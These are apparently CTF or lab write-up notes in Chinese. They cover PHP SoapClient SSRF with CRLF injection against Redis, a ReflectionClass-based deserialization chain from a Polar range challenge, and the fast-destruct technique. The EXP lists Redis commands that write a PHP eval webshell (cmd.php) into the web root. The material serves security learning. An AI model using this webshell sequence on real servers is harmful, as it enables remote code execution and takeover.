SOAP客户端SSRF攻击Redis服务

题目：

EXP：

  • AUTH 20251206 - Redis认证（密码提示在注释中）
  • CONFIG SET dir /var/www/html - 设置数据库保存目录为web根目录
  • SET x '<? @eval($_POST[1]);?>' - 设置键值对，值为webshell
  • CONFIG SET dbfilename cmd.php - 设置数据库文件名为webshell
  • SAVE - 保存数据库到文件

SoapClient SSRF原理：

  • SoapClient在反序列化时可以构造HTTP请求
  • location指定目标URL
  • uri参数会出现在SOAP请求的Header中
  • 通过CRLF注入实现Redis协议命令执行

反射类ReflectionClass机制

源自PHP特性之反射类ReflectionClass机制 - dynasty_chenzi - 博客园

以polar靶场的一道php题来实例：

能直接获取flag的只有FlagReader类的toString()方法

核心目标是：让FlagReader实例被当作字符串输出

再看VulnerableClass的__destruct()方法

  1. $this->debugMode必须为true，才会执行echo $this->logger
  2. $this->logger必须是FlagReader实例，这样echo时才会触发其__toString()

所以我们需要构造一个VulnerableClass对象，满足：

  • debugMode = true
  • logger = FlagReader实例

为什么需要反射机制？

VulnerableClass中的debugMode是私有属性：

私有属性（private）的访问权限被严格限制：

  • 不能通过$vuln->debugMode = true直接修改
  • 即使在类外部重新定义类，也无法绕过访问限制

这时候就需要反射机制（Reflection） 来突破限制：

强行将私有属性debugMode从false改为true，这是整个 EXP 的核心突破点。

fast-destruct

  • 在PHP中如果单独执行unserialize()函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行__destruct()方法
  • 而如果将unserialize()函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行__destruct()
